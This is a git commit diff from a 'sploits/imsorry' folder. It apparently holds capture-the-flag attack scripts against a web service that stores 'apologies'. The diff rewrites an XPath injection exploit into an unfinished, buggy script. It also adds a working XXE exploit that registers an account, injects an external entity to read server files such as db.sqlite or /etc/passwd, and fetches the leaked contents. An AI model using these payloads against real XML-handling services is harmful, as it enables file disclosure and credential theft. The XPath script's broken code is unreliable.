65211b3654fb068e3952d014810df837cc7304d0
Alexander Muravlev <crash.1244@yandex.ru>
2019-03-16 22:57:54 +0300

    fix

--- sploits/imsorry/tesh0k0t_imsorry_xpath.py
+++ sploits/imsorry/tesh0k0t_imsorry_xpath.py
@@ -1,10 +1,33 @@
-# TEST2 это существующий пользователь в этом документе 
-# кому принадлежит извинение
-name_exploit = "TEST2']/../apology[@private='true"
+import requests as rq
+import sys 
+from random import choice, randint
+from string import  ascii_letters
+from base64 import b64encode
+import requests as rq
+import sys 
 
-<root><apologies><apology id="1" private="true" nickname_receiver="A_VOT_NE_SKAZU"><apology_text>HAX1</apology_text></apology></apologies></root>
-"""admin
---><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:////home/texh0k0t/kek'>]><!--"""
+host = sys.argv[0]
 
-admin
-foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:////home/texh0k0t/kek'>]><root><apologies><apology id='1' private='true' nickname_receiver	='A_VOT_NE_SKAZU'><apology_text>&xxe;</apology_text></apology></apologies></root><!--
+def gen_random_string(N=5):
+	return "".join(choice(ascii_letters) for i in range(N))
+
+def create_headers(username, password):
+	auth_string = b64encode("{}:{}".format(username, password).encode()).decode()
+	headers = {"Authorization":"Basic {}".format(auth_string)}
+	return headers
+
+username = "FARGATETOP{}".format(randint(10000, 99999))
+
+try:
+	host = sys.argv[0]
+except:
+	host = "127.0.0.1"
+	# host = "6.6.1.2"
+id_apology = ""
+payload = "{}']/../apology[@private='true".format(id_apology)
+host = "127.0.0.1"
+# host = "6.6.1.2"
+url = "http://{}:14567".format(host)
+rq.get()
+
+
---
+++ sploits/imsorry/tesh0k0t_imsorry_xxe.py
@@ -0,0 +1,44 @@
+from random import choice, randint
+from string import  ascii_letters
+from base64 import b64encode
+import requests as rq
+import sys 
+
+host = sys.argv[0]
+
+def gen_random_string(N=5):
+	return "".join(choice(ascii_letters) for i in range(N))
+
+def create_headers(username, password):
+	auth_string = b64encode("{}:{}".format(username, password).encode()).decode()
+	headers = {"Authorization":"Basic {}".format(auth_string)}
+	return headers
+
+username = "FARGATETOP{}".format(randint(10000, 99999))
+# file_path = "/etc/passwd"
+# file_path = "/usr/src/app/config.ru"
+file_path = "/usr/src/app/db.sqlite"
+id_apology = gen_random_string()
+payload = """{}
+[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:///{}'>]><root><apologies direction="in"><apology id='{}' private='true' nickname='A_VOT_NE_SKAZU'><apology_text>&xxe;</apology_text></apology></apologies></root><!--""".format(username,file_path, id_apology)
+
+password = "zzz"
+print(username, password)
+
+try:
+	host = sys.argv[0]
+except:
+	host = "127.0.0.1"
+	# host = "6.6.1.2"
+url = "http://{}:14567".format(host)
+
+res = rq.post(url.format(host)+"/register", data={"username":username, "password":password})
+headers = create_headers(username, password)
+data = {"nickname_receiver":payload,
+		"private":"true",
+		"apology_text":"ZZZZZZZZZZ"}
+res = rq.post(url+"/apology", headers=headers, data=data)
+# print(res.text)
+
+res = rq.get(url.format(host)+"/apology/read?nickname_sender={}&id={}".format(username, id_apology), headers=headers)
+# print(res.text)
